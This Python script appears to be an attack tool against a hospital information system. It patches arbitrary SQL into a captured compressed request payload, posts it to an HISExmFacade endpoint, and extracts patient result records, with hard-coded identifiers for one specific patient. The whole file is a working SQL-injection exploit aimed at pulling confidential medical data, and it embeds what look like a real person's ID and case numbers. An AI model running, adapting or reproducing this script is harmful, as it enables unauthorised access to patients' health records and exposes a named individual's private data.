from his_client_final import HISClient
import requests
import zlib
import re

class PatResultFetcher(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = PatResultFetcher()
hhisnum = '003617083J'
hidno = 'C221748019'
caseno = '46806581'

search_conditions = [
    f"PRH_PAT_ID = '{hidno}'",
    f"PRH_PAT_ID = '{hhisnum}'",
    f"PRH_PAT_CASENO = '{caseno}'"
]

trx_nums = []

print("Searching PAT_RESULTH...")
for cond in search_conditions:
    sql = f"SELECT PRH_TRX_NUM, PRH_TRX_DT, PRH_PAT_ID, PRH_PAT_NAME FROM OPDUSR.PAT_RESULTH WHERE {cond}"
    print(f"--- Querying: {sql} ---")
    res = hunter.execute_sql(sql)
    
    if res and "<NewDataSet>" in res:
        print("!!! FOUND HEADER !!!")
        print(res[:2000])
        matches = re.findall(r'<PRH_TRX_NUM>(.*?)</PRH_TRX_NUM>', res)
        for m in matches:
            if m not in trx_nums:
                trx_nums.append(m)

if trx_nums:
    print(f"\nFound {len(trx_nums)} Transaction Numbers. Fetching Details for most recent...")
    # Assume sorting by TRX_NUM descending or Date?
    # For now, take the last one found (or first?)
    target = trx_nums[0] 
    
    print(f"Fetching details for PRH_TRX_NUM: {target}")
    sql_det = f"SELECT * FROM OPDUSR.PAT_RESULTD WHERE PRD_TRX_NUM = '{target}'"
    res_det = hunter.execute_sql(sql_det)
    
    if res_det and "<NewDataSet>" in res_det:
        print("!!! FOUND DETAILS !!!")
        print(res_det[:5000])
    else:
        print("[-] No details found for this TRX_NUM.")
else:
    print("[-] No valid PRH_TRX_NUM found.")
